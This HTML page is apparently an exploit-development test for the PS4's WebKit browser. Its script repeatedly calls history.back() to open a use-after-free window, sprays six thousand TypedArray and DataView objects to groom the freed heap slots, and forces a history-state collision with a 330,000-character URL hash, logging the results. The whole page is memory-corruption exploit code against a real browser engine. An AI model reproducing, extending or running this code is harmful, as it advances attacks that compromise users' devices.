
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit – Slot Fixation V2</title>
</head>
<body>

<h1>Slot Fixation V2 – TypedArray Header Capture</h1>
<button onclick="run()">RUN TEST</button>
<pre id="log"></pre>

<script>
function log(s) {
    document.getElementById("log").textContent += s + "\n";
}

/* ================================
   UAF TRIGGER (INALTERADO)
================================ */
async function triggerUAF() {
    log("=== UAF TRIGGER START ===");
    for (let i = 0; i < 48; i += 6) {
        history.back();
        log("[ITER " + i + "] back() async");
        await new Promise(r => setTimeout(r, 1));
    }
    log(">>> UAF WINDOW <<<");
}

/* ================================
   SLOT FIXATION V2
   (CORREÇÃO REAL)
================================ */
function allocateSlotFixers() {
    log("\n=== SLOT FIXATION PHASE (V2) ===");

    let keep = [];

    /* 1️⃣ Zero-length TypedArray headers */
    for (let i = 0; i < 2000; i++) {
        keep.push(new Uint8Array(0));
    }

    /* 2️⃣ Minimal ArrayBuffer-backed views */
    for (let i = 0; i < 2000; i++) {
        keep.push(new DataView(new ArrayBuffer(16)));
    }

    /* 3️⃣ Small typed arrays matching JSCell allocator */
    for (let i = 0; i < 2000; i++) {
        keep.push(new Uint16Array(1));
    }

    log("Allocated TypedArray/DataView headers: " + keep.length);
    return keep;
}

/* ================================
   CONTROLLED HISTORY COLLISION
================================ */
function controlCollision() {
    log("\n=== CONTROL COLLISION ===");

    let small = "#A";
    let large = "#" + "B".repeat(330000);

    history.replaceState({ctrl: "A"}, "", small);
    history.replaceState({ctrl: "B"}, "", large);

    history.back();
}

/* ================================
   MAIN TEST
================================ */
async function run() {
    document.getElementById("log").textContent = "";

    /* Baseline */
    log("=== BASELINE ===");
    log("URL.length = " + location.href.length);
    log("history.state = " + JSON.stringify(history.state));
    log("history.length = " + history.length);

    await triggerUAF();

    /* Fix slot */
    let slotKeepAlive = allocateSlotFixers();

    /* Collision */
    controlCollision();

    /* Observe */
    setTimeout(() => {
        log("\n=== POST ===");
        log("URL.length = " + location.href.length);
        log("hash.length = " + location.hash.length);
        log("history.state = " + JSON.stringify(history.state));
        log("history.length = " + history.length);

        let ctrl = history.state ? history.state.ctrl : undefined;
        log("\n=== CONSISTENCY CHECK ===");
        log("Final ctrl = " + ctrl);
        log("=== TEST END ===");

        /* Prevent GC */
        window.__keep = slotKeepAlive;
    }, 50);
}
</script>

</body>
</html>
